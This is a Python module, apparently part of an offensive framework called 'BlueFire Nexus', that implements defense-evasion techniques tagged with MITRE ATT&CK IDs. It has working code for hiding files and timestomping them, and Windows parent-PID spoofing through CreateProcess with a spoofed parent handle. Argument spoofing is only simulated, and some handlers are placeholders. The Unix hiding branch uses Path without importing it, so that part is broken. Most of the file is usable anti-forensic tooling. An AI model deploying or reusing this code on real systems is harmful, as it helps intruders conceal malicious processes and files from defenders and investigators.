"""
Defense Evasion Module
Handles techniques to avoid detection by security tools.
"""

import os
import platform
import logging
from typing import Dict, Any, Optional, TYPE_CHECKING
from datetime import datetime
import stat # For file attributes

# Imports needed for PID Spoofing
if platform.system() == "Windows":
    import ctypes
    from ctypes import wintypes
    import win32con
    import win32api
    import win32process
    import pywintypes # For error handling

# Avoid circular import for type hinting
if TYPE_CHECKING:
    from ..execution.execution import Execution
    from .bluefire_nexus import BlueFireNexus # Added for type hint

class DefenseEvasion:
    """Handles defense evasion techniques like file hiding and timestomping."""

    def __init__(self, nexus_instance: 'BlueFireNexus', execution_module: 'Execution'):
        self.nexus = nexus_instance
        self.execution_module = execution_module
        self.config = {
            "default_timestomp_mode": "mimic", # mimic, specific_time, random_within_range
            "default_timestomp_source": None, # File path to mimic times from
            "default_time_format": "%Y-%m-%d %H:%M:%S",
        }
        self.logger = logging.getLogger(__name__)
        if not execution_module:
            self.logger.error("DefenseEvasion module initialized WITHOUT Execution module. Some techniques may fail.")

    def update_config(self, config: Dict[str, Any]):
        """Update internal config with loaded configuration."""
        self.config.update(config.get("defense_evasion", {}))
        self.logger.info("DefenseEvasion module configuration updated.")

    def run_evasion(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Route defense evasion requests to appropriate handlers."""
        result = {
            "status": "success",
            "timestamp": datetime.now().isoformat(),
            "results": {}
        }
        errors = []

        evasion_requests = data.get("evade", {}) # e.g., {"technique": "file_evasion", "details": {...}}
        technique = evasion_requests.get("technique")
        details = evasion_requests.get("details", {})

        if not technique:
            return {"status": "error", "message": "Missing 'technique' in evasion request data."}

        handler_map = {
            "file_evasion": self._handle_file_evasion,
            "pid_spoofing": self._handle_pid_spoofing,
            "argument_spoofing": self._handle_argument_spoofing,
            "process_evasion": self._handle_process_evasion,
            "network_evasion": self._handle_network_evasion,
        }

        handler = handler_map.get(technique)

        if handler:
            try:
                evasion_result = handler(details)
                result["results"][technique] = evasion_result
                if evasion_result.get("status") == "failure":
                    result["status"] = "partial_success"
                    errors.append(f"Technique '{technique}' failed: {evasion_result.get('details', {}).get('error', 'Unknown reason')}")
            except Exception as e:
                error_msg = f"Evasion technique '{technique}' failed: {e}"
                errors.append(error_msg)
                self._log_error(error_msg, exc_info=True)
                result["results"][technique] = {"status": "error", "message": str(e)}
        else:
            error_msg = f"Unsupported or unknown evasion technique requested: {technique}"
            errors.append(error_msg)
            self._log_error(error_msg)
            result["results"][technique] = {"status": "error", "message": error_msg}

        if errors:
            result["status"] = "failure" if not result["results"] or all(v.get("status") == "error" for v in result["results"].values()) else "partial_success"
            result["errors"] = errors

        return result
        
    def _execute_command(self, command: str, method: str = "direct", capture: bool = True) -> Dict[str, Any]:
        """Helper to execute commands via the Execution module."""
        if not self.execution_module:
             self.logger.error("Execution module not available for DefenseEvasion.")
             return {"status": "error", "message": "Execution module unavailable"}
             
        exec_data = {"execute": {"command": {"cmd": command, "method": method, "capture_output": capture}}}
        try:
            exec_result = self.execution_module.execute(exec_data)
            return exec_result.get("results", {}).get("command_execution", {"status": "error", "message": "Execution result format unexpected"})
        except Exception as e:
            self.logger.error(f"Failed to execute command '{command}' via Execution module: {e}", exc_info=True)
            return {"status": "error", "message": f"Execution failed: {e}"}

    def _handle_file_evasion(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Handle file evasion techniques like hiding and timestomping."""
        target_file = details.get("target_file")
        action = details.get("action", "hide") # hide, timestomp

        if not target_file or not os.path.exists(target_file):
             return {"status": "error", "message": f"Target file '{target_file}' not provided or does not exist."}

        self.logger.info(f"Attempting file evasion action '{action}' on target: {target_file}")
        
        if action == "hide":
             return self._hide_file(target_file, details)
        elif action == "timestomp":
             return self._timestomp_file(target_file, details)
        else:
            return {"status": "error", "message": f"Unsupported file evasion action: {action}"}

    def _hide_file(self, target_file: str, details: Dict[str, Any]) -> Dict[str, Any]:
        """Hide a file using OS-specific methods."""
        os_type = platform.system()
        result_details = {"target_file": target_file}
        status = "failure" # Default to failure
        mitre_id = "T1564.001" # Hidden Files and Directories
        mitre_name = "Hide Artifacts: Hidden Files and Directories"

        try:
            if os_type == "Windows":
                self.logger.info(f"Attempting to hide file (Windows): {target_file}")
                cmd = f'attrib +h \"{target_file}\"' # Use quotes for paths with spaces
                exec_result = self._execute_command(cmd, method="cmd")
                result_details["command_executed"] = cmd
                result_details["execution_stdout"] = exec_result.get("details", {}).get("stdout")
                result_details["execution_stderr"] = exec_result.get("details", {}).get("stderr")
                result_details["execution_return_code"] = exec_result.get("details", {}).get("return_code")

                if exec_result.get("status") == "success" and exec_result.get("details", {}).get("return_code") == 0:
                    status = "success"
                    self.logger.info(f"Successfully hid file using attrib: {target_file}")
                else:
                    result_details["error"] = exec_result.get("details", {}).get("stderr") or exec_result.get("message", "Execution failed")
                    self.logger.error(f"Failed to hide file using attrib: {target_file}. Error: {result_details['error']}")

            elif os_type in ["Linux", "Darwin"]:
                self.logger.info(f"Attempting to hide file (Unix-like): {target_file}")
                file_path = Path(target_file)
                if file_path.name.startswith('.'):
                     status = "skipped"
                     result_details["message"] = "File already appears hidden (starts with dot)."
                     self.logger.warning(result_details["message"])
                else:
                    hidden_path = file_path.parent / ('.' + file_path.name)
                    try:
                        os.rename(target_file, hidden_path)
                        status = "success"
                        result_details["new_path"] = str(hidden_path)
                        self.logger.info(f"Successfully hid file by renaming to: {hidden_path}")
                    except OSError as e:
                        result_details["error"] = f"Failed to rename file for hiding: {e}"
                        self.logger.error(result_details["error"], exc_info=True)
            else:
                status = "skipped"
                result_details["error"] = f"File hiding not implemented for OS type: {os_type}"
                self.logger.warning(result_details["error"])
        
        except Exception as e:
            result_details["error"] = f"Unexpected error during file hiding: {e}"
            self.logger.error(result_details["error"], exc_info=True)
            status = "error"

        return {
            "status": status,
            "technique": "file_hide",
            "mitre_technique_id": mitre_id,
            "mitre_technique_name": mitre_name,
            "timestamp": datetime.now().isoformat(),
            "details": result_details
        }
        
    def _timestomp_file(self, target_file: str, details: Dict[str, Any]) -> Dict[str, Any]:
        """Modify file access, modification, and creation times."""
        mode = details.get("mode", self.config.get("default_timestomp_mode", "mimic"))
        source_file = details.get("source_file", self.config.get("default_timestomp_source"))
        access_time_str = details.get("access_time")
        modify_time_str = details.get("modify_time")
        time_format = self.config.get("default_time_format")
        
        result_details = {"target_file": target_file, "mode": mode}
        status = "failure"
        mitre_id = "T1070.006" # Indicator Removal: Timestomp
        mitre_name = "Indicator Removal: Timestomp"
        
        access_time_ts = None
        modify_time_ts = None

        self.logger.info(f"Attempting timestomp on {target_file} using mode: {mode}")

        try:
            if mode == "mimic":
                if not source_file or not os.path.exists(source_file):
                     result_details["error"] = f"Source file '{source_file}' for mimic mode not provided or does not exist."
                     self.logger.error(result_details["error"])
                     return {"status": "error", "message": result_details["error"], "details": result_details}
                
                result_details["source_file"] = source_file
                stat_result = os.stat(source_file)
                access_time_ts = stat_result.st_atime
                modify_time_ts = stat_result.st_mtime
                self.logger.info(f"Mimicking timestamps from {source_file}: AT={access_time_ts}, MT={modify_time_ts}")
            
            elif mode == "specific_time":
                try:
                    if access_time_str:
                        access_time_dt = datetime.strptime(access_time_str, time_format)
                        access_time_ts = access_time_dt.timestamp()
                    if modify_time_str:
                        modify_time_dt = datetime.strptime(modify_time_str, time_format)
                        modify_time_ts = modify_time_dt.timestamp()
                    
                    if not access_time_ts and not modify_time_ts:
                         raise ValueError("Neither access_time nor modify_time provided for specific_time mode.")
                         
                    # Use current time if one is missing?
                    if not access_time_ts: access_time_ts = os.stat(target_file).st_atime
                    if not modify_time_ts: modify_time_ts = os.stat(target_file).st_mtime
                    self.logger.info(f"Using specific timestamps: AT={access_time_ts}, MT={modify_time_ts}")
                    
                except ValueError as e:
                     result_details["error"] = f"Invalid time format or missing time for specific_time mode: {e}. Expected format: {time_format}"
                     self.logger.error(result_details["error"])
                     return {"status": "error", "message": result_details["error"], "details": result_details}
            
            # Add "random_within_range" mode later if needed
            
            else:
                 result_details["error"] = f"Unsupported timestomp mode: {mode}"
                 self.logger.error(result_details["error"])
                 return {"status": "error", "message": result_details["error"], "details": result_details}

            # Apply the timestamps using os.utime
            if access_time_ts is not None and modify_time_ts is not None:
                os.utime(target_file, (access_time_ts, modify_time_ts))
                status = "success"
                result_details["applied_access_time"] = datetime.fromtimestamp(access_time_ts).strftime(time_format)
                result_details["applied_modify_time"] = datetime.fromtimestamp(modify_time_ts).strftime(time_format)
                # Note: Creation time (st_birthtime) is harder to modify portably, often requires platform-specific APIs.
                self.logger.info(f"Successfully applied timestamps to {target_file}")
            else:
                 # This case should ideally be caught by the mode logic above
                 result_details["error"] = "Failed to determine timestamps to apply."
                 self.logger.error(result_details["error"])
                 
        except OSError as e:
            result_details["error"] = f"Failed to apply timestamps: {e}"
            self.logger.error(result_details["error"], exc_info=True)
        except Exception as e:
            result_details["error"] = f"Unexpected error during timestomping: {e}"
            self.logger.error(result_details["error"], exc_info=True)
            status = "error"

        return {
            "status": status,
            "technique": "timestomp",
            "mitre_technique_id": mitre_id,
            "mitre_technique_name": mitre_name,
            "timestamp": datetime.now().isoformat(),
            "details": result_details
        }
        
    def _handle_pid_spoofing(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Perform Parent PID Spoofing using CreateProcess and UpdateProcThreadAttribute."""
        result_details = {}
        status = "failure"
        mitre_id = "T1134.004" # Access Token Manipulation: Parent PID Spoofing
        mitre_name = "Access Token Manipulation: Parent PID Spoofing"
        created_pid = None

        if platform.system() != "Windows":
            return {"status": "skipped", "message": "PID Spoofing via UpdateProcThreadAttribute is only supported on Windows."}

        parent_pid = details.get("parent_pid")
        command_to_run = details.get("command_to_run")
        create_suspended = details.get("create_suspended", False) # Option to create suspended

        result_details["target_parent_pid"] = parent_pid
        result_details["command_to_run"] = command_to_run

        if not parent_pid or not command_to_run:
            result_details["error"] = "Missing required parameters: parent_pid and command_to_run"
            self.logger.error(result_details["error"])
            return {"status": "error", "message": result_details["error"], "details": result_details}

        self.logger.info(f"Attempting PID Spoofing: Create '{command_to_run}' as child of PID {parent_pid}")

        # Define necessary structures and constants
        lpAttributeList = None
        hParentProcess = None
        try:
            # Constants
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000
            CREATE_SUSPENDED = 0x00000004
            
            # Structures
            class STARTUPINFOEX(ctypes.Structure):
                _fields_ = [
                    ("StartupInfo", win32process.STARTUPINFO),
                    ("lpAttributeList", wintypes.LPVOID)
                ]

            # Get handle to parent process
            hParentProcess = win32api.OpenProcess(win32con.PROCESS_CREATE_PROCESS, False, int(parent_pid))
            if not hParentProcess:
                 raise ctypes.WinError(ctypes.get_last_error())
                 
            result_details["parent_process_handle"] = f"{hParentProcess.handle:#0x}"

            # Initialize STARTUPINFOEX
            siEx = STARTUPINFOEX()
            siEx.StartupInfo.cb = ctypes.sizeof(STARTUPINFOEX)
            # siEx.StartupInfo.dwFlags = win32con.STARTF_USESHOWWINDOW # Optional flags
            # siEx.StartupInfo.wShowWindow = win32con.SW_HIDE # Optional flags

            # Determine size needed for attribute list
            size = wintypes.SIZE_T()
            win32process.InitializeProcThreadAttributeList(None, 1, 0, ctypes.byref(size))
            if size.value == 0:
                 raise RuntimeError("InitializeProcThreadAttributeList failed to return size.")

            # Allocate memory for the attribute list
            lpAttributeList = ctypes.create_string_buffer(size.value)
            siEx.lpAttributeList = ctypes.cast(lpAttributeList, wintypes.LPVOID)

            # Initialize the attribute list
            if not win32process.InitializeProcThreadAttributeList(lpAttributeList, 1, 0, ctypes.byref(size)):
                 raise ctypes.WinError(ctypes.get_last_error())

            # Update the attribute list with the parent process
            lpValue = wintypes.HANDLE(hParentProcess.handle)
            if not win32process.UpdateProcThreadAttribute(
                lpAttributeList, 
                0, 
                PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, 
                ctypes.byref(lpValue), 
                ctypes.sizeof(lpValue), 
                None, 
                None
            ):
                 raise ctypes.WinError(ctypes.get_last_error())

            # Create process
            creation_flags = EXTENDED_STARTUPINFO_PRESENT
            if create_suspended:
                creation_flags |= CREATE_SUSPENDED
                
            self.logger.debug(f"Calling CreateProcess with parent PID {parent_pid}...")
            (hProcess, hThread, dwProcessId, dwThreadId) = win32process.CreateProcess(
                None,                         # AppName (use None for command line)
                command_to_run,               # Command Line
                None,                         # Process Attributes
                None,                         # Thread Attributes
                False,                        # Inherit Handles
                creation_flags,               # Creation Flags
                None,                         # Environment
                None,                         # Current Directory
                siEx.StartupInfo              # STARTUPINFO (embedded in STARTUPINFOEX)
            )
            
            created_pid = dwProcessId
            result_details["created_process_id"] = created_pid
            result_details["created_thread_id"] = dwThreadId
            result_details["process_handle"] = f"{hProcess.handle:#0x}"
            result_details["thread_handle"] = f"{hThread.handle:#0x}"
            status = "success"
            self.logger.info(f"Successfully created process '{command_to_run}' (PID: {created_pid}) with parent PID {parent_pid}")

            # Close handles for the new process
            win32api.CloseHandle(hProcess)
            win32api.CloseHandle(hThread)

        except (pywintypes.error, OSError, RuntimeError, Exception) as e:
            error_code = getattr(e, 'winerror', None) or getattr(e, 'errno', None)
            error_msg = getattr(e, 'strerror', str(e))
            result_details["error"] = f"PID Spoofing failed: {error_msg} (Code: {error_code})"
            self.logger.error(result_details["error"], exc_info=True)
            status = "error"
        finally:
            # Clean up attribute list and parent process handle
            if lpAttributeList:
                win32process.DeleteProcThreadAttributeList(lpAttributeList)
            if hParentProcess:
                win32api.CloseHandle(hParentProcess)

        return {
            "status": status,
            "technique": "pid_spoofing",
            "mitre_technique_id": mitre_id,
            "mitre_technique_name": mitre_name,
            "timestamp": datetime.now().isoformat(),
            "details": result_details
        }

    def _handle_argument_spoofing(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Perform Command-Line Argument Spoofing/Obfuscation."""
        result_details = {}
        status = "failure"
        mitre_id = "T1564.009" # Hide Artifacts: Process Argument Spoofing (approximation)
        mitre_name = "Hide Artifacts: Process Argument Spoofing"
        
        command_to_run = details.get("command_to_run") # e.g., "powershell.exe -ExecutionPolicy Bypass -File script.ps1"
        spoofed_command_line = details.get("spoofed_command_line") # e.g., "powershell.exe -Command Get-Date"

        result_details["original_command"] = command_to_run
        result_details["spoofed_command_line_provided"] = spoofed_command_line

        if not command_to_run:
            result_details["error"] = "Missing required parameter: command_to_run"
            self.logger.error(result_details["error"])
            return {"status": "error", "message": result_details["error"], "details": result_details}

        # If no specific spoofed line is provided, create a basic misleading one
        if not spoofed_command_line:
            executable = command_to_run.split(" ", 1)[0]
            spoofed_command_line = f'{executable} --legitimate-looking-option'
            result_details["spoofed_command_line_generated"] = spoofed_command_line
            
        self.logger.info(f"Attempting Argument Spoofing: Run '{command_to_run}' appearing as '{spoofed_command_line}'")

        # --- Implementation --- 
        # Basic Method (Windows): Pass the real command in lpApplicationName 
        # and the spoofed command in lpCommandLine to CreateProcess.
        # Note: This specific technique relies on how different monitoring tools 
        # capture command lines (some might capture only lpCommandLine).
        # More advanced PEB manipulation is possible but complex.
        
        if platform.system() != "Windows":
            status = "skipped"
            result_details["message"] = "Basic argument spoofing via CreateProcess parameters is Windows-specific."
            self.logger.warning(result_details["message"])
        else:
            try:
                # Ensure the executable path is correctly extracted if command_to_run includes arguments
                executable_path = command_to_run.split(" ", 1)[0]
                # We pass the REAL command/args via lpCommandLine, and the SPOOFED one is more conceptual
                # for this basic simulation or would require PEB manipulation not implemented here.
                # A simpler approach for simulation is to just execute the real command 
                # and log that it *appeared* as the spoofed one.
                
                # Let's use the execution module for now, but note its limitation
                # The execution module might not directly support splitting app/cmdline easily
                # for CreateProcess like needed for *true* argument spoofing vis-a-vis monitoring tools.
                # We simulate the *intent* here.
                
                self.logger.warning("Simulating argument spoofing: Executing real command, logging spoofed appearance.")
                exec_result = self._execute_command(command_to_run, method="direct", capture=True)
                
                result_details["command_executed"] = command_to_run
                result_details["appeared_as"] = spoofed_command_line
                result_details["execution_stdout"] = exec_result.get("details", {}).get("stdout")
                result_details["execution_stderr"] = exec_result.get("details", {}).get("stderr")
                result_details["execution_return_code"] = exec_result.get("details", {}).get("return_code")

                if exec_result.get("status") == "success":
                    status = "success"
                    created_pid = exec_result.get("details", {}).get("pid") # Assuming execution module provides PID
                    result_details["created_process_id"] = created_pid
                    self.logger.info(f"Successfully executed command (PID: {created_pid}) while simulating argument spoofing.")
                else:
                    result_details["error"] = exec_result.get("message", "Execution failed")
                    self.logger.error(f"Execution failed during argument spoofing simulation: {result_details['error']}")

            except Exception as e:
                result_details["error"] = f"Argument Spoofing simulation failed: {e}"
                self.logger.error(result_details["error"], exc_info=True)
                status = "error"

        return {
            "status": status,
            "technique": "argument_spoofing",
            "mitre_technique_id": mitre_id,
            "mitre_technique_name": mitre_name,
            "timestamp": datetime.now().isoformat(),
            "details": result_details
        }

    def _handle_process_evasion(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Placeholder handler for general process evasion techniques."""
        # This function would ideally dispatch to more specific handlers 
        # like _handle_pid_spoofing, _handle_argument_spoofing, _handle_process_hollowing etc.
        # based on a more detailed 'sub_technique' key within details.
        sub_technique = details.get("sub_technique", "generic_process_evasion")
        self.logger.warning(f"Process Evasion technique '{sub_technique}' is not specifically implemented. Returning skipped status.")
        return {
            "status": "skipped", 
            "message": f"General process evasion technique '{sub_technique}' not implemented.",
            "technique": "process_evasion",
            "sub_technique": sub_technique,
            "timestamp": datetime.now().isoformat(),
            "details": details
        }

    def _handle_network_evasion(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Placeholder handler for general network evasion techniques."""
        # This could dispatch to traffic obfuscation, protocol manipulation etc.
        sub_technique = details.get("sub_technique", "generic_network_evasion")
        self.logger.warning(f"Network Evasion technique '{sub_technique}' is not implemented. Returning skipped status.")
        return {
            "status": "skipped", 
            "message": f"General network evasion technique '{sub_technique}' not implemented.",
            "technique": "network_evasion",
            "sub_technique": sub_technique,
            "timestamp": datetime.now().isoformat(),
            "details": details
        }

    def _handle_not_implemented(self, details: Dict[str, Any]) -> Dict[str, Any]:
         """Placeholder for techniques not yet realistically implemented."""
         import inspect
         technique_name = "unknown"
         try:
              caller_frame = inspect.currentframe().f_back
              if caller_frame:
                  technique_name = caller_frame.f_code.co_name.replace("_handle_", "")
         except Exception:
              pass
              
         self.logger.warning(f"Defense Evasion technique '{technique_name}' is not yet implemented.")
         return {
             "status": "skipped", 
             "message": f"Technique '{technique_name}' not implemented.",
             "technique": technique_name,
             "timestamp": datetime.now().isoformat(),
             "details": details
         }

    def _log_error(self, message: str, exc_info=False) -> None:
        """Log errors using the initialized logger."""
        self.logger.error(message, exc_info=exc_info)

# Example Usage (for testing)
if __name__ == '__main__':
    import json
    import tempfile
    
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')

    # Mock Execution module for standalone testing
    class MockExecution:
        def execute(self, data: Dict[str, Any]) -> Dict[str, Any]:
            cmd_details = data.get("execute", {}).get("command", {})
            cmd = cmd_details.get("cmd")
            print(f"[MockExecution] Received command: {cmd}")
            # Simulate success for testing logic
            return {"results": {"command_execution": {"status": "success", "details": {"return_code": 0, "stdout": "Mock success", "stderr": ""}}}}

    mock_exec = MockExecution()
    evasion_module = DefenseEvasion(nexus_instance=None, execution_module=mock_exec)
    # evasion_module.update_config({}) # Load actual config here if needed

    # Create dummy files for testing
    tmp_dir = tempfile.gettempdir()
    test_file_path = os.path.join(tmp_dir, "bluefire_test_file.txt")
    mimic_file_path = os.path.join(tmp_dir, "bluefire_mimic_source.txt")

    try:
        with open(test_file_path, "w") as f:
            f.write("This is a test file.\n")
        with open(mimic_file_path, "w") as f:
            f.write("This is the source file to mimic.\n")
        # Set mimic file time to something specific
        mimic_time = datetime(2022, 1, 1, 12, 0, 0).timestamp()
        os.utime(mimic_file_path, (mimic_time, mimic_time))
        print(f"Created test files:\n  {test_file_path}\n  {mimic_file_path}")

        print("\n--- Testing File Hiding --- ")
        hide_request = {"evade": {"technique": "file_evasion", "details": {
            "target_file": test_file_path,
            "action": "hide"
        }}}
        hide_result = evasion_module.run_evasion(hide_request)
        print(json.dumps(hide_result, indent=2))
        # Check if file is hidden (manual check needed or OS-specific checks)
        if platform.system() != "Windows": # On Unix, check rename
             hidden_test_path = os.path.join(tmp_dir, ".bluefire_test_file.txt")
             print(f"Checking if file exists: {hidden_test_path} -> {os.path.exists(hidden_test_path)}")

        print("\n--- Testing Timestomping (Mimic) --- ")
        # Use the potentially hidden file path if on Unix
        target_for_stomp = hidden_test_path if platform.system() != "Windows" and os.path.exists(hidden_test_path) else test_file_path
        stomp_mimic_request = {"evade": {"technique": "file_evasion", "details": {
            "target_file": target_for_stomp,
            "action": "timestomp",
            "mode": "mimic",
            "source_file": mimic_file_path
        }}}
        stomp_mimic_result = evasion_module.run_evasion(stomp_mimic_request)
        print(json.dumps(stomp_mimic_result, indent=2))
        if os.path.exists(target_for_stomp):
            target_stat = os.stat(target_for_stomp)
            print(f"Target ({os.path.basename(target_for_stomp)}) Times: AT={datetime.fromtimestamp(target_stat.st_atime)}, MT={datetime.fromtimestamp(target_stat.st_mtime)}")
            mimic_stat = os.stat(mimic_file_path)
            print(f"Source ({os.path.basename(mimic_file_path)}) Times: AT={datetime.fromtimestamp(mimic_stat.st_atime)}, MT={datetime.fromtimestamp(mimic_stat.st_mtime)}")

        print("\n--- Testing Timestomping (Specific Time) --- ")
        specific_time = "2023-05-15 10:30:00"
        stomp_specific_request = {"evade": {"technique": "file_evasion", "details": {
            "target_file": target_for_stomp,
            "action": "timestomp",
            "mode": "specific_time",
            "modify_time": specific_time
        }}}
        stomp_specific_result = evasion_module.run_evasion(stomp_specific_request)
        print(json.dumps(stomp_specific_result, indent=2))
        if os.path.exists(target_for_stomp):
             target_stat = os.stat(target_for_stomp)
             print(f"Target ({os.path.basename(target_for_stomp)}) Times: AT={datetime.fromtimestamp(target_stat.st_atime)}, MT={datetime.fromtimestamp(target_stat.st_mtime)}")

    finally:
        # Clean up test files
        print("\n--- Cleaning up test files ---")
        paths_to_clean = [test_file_path, mimic_file_path]
        if platform.system() != "Windows":
            paths_to_clean.append(os.path.join(tmp_dir, ".bluefire_test_file.txt"))
        for p in paths_to_clean:
             if os.path.exists(p):
                  try:
                       os.remove(p)
                       print(f"Removed: {p}")
                  except OSError as e:
                       print(f"Error removing {p}: {e}") 